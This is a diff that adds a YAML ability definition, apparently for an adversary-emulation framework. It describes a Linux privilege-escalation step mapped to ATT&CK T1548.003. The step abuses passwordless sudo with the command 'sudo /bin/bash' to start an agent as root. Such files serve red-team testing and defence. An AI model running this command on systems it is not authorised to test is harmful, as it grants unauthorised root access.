@@ -1,0 +1,13 @@
+- description: Abuse poor configuration where bash can be executed with sudo privileges without password.
+  id: ce6628bc-c1e2-456b-91e7-da5b8bcd4005
+  name: Abuse bash can be executed with sudo privileges
+  platforms:
+    linux:
+      sh:
+        command: 'sudo /bin/bash #{host.file.start_agent}'
+  repeatable: false
+  requirements: []
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1548.003
+    name: 'Abuse Elevation Control Mechanism: Sudo and Sudo Caching'
